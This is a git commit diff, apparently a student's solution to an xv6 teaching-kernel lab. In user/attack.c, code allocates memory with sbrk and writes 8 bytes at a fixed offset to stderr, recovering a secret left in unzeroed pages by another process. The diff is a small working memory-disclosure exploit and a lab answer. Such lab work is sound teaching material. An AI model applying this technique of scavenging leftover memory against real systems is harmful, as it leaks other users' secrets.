f709d818a68e55763bf2077c803021ed15078b4f
hotaChen <delight@tongji.edu.cn>
2025-09-02 15:48:17 +0800

    third commit

--- user/attack.c
+++ user/attack.c
@@ -2,12 +2,11 @@
 #include "kernel/fcntl.h"
 #include "user/user.h"
 #include "kernel/riscv.h"
-
 int
 main(int argc, char *argv[])
 {
-  // your code here.  you should write the secret to fd 2 using write
-  // (e.g., write(2, secret, 8)
-
-  exit(1);
+  char *end = sbrk(PGSIZE*32);
+  end=end+16*PGSIZE;
+  write(2,end+32,8);
+  exit(0);
 }
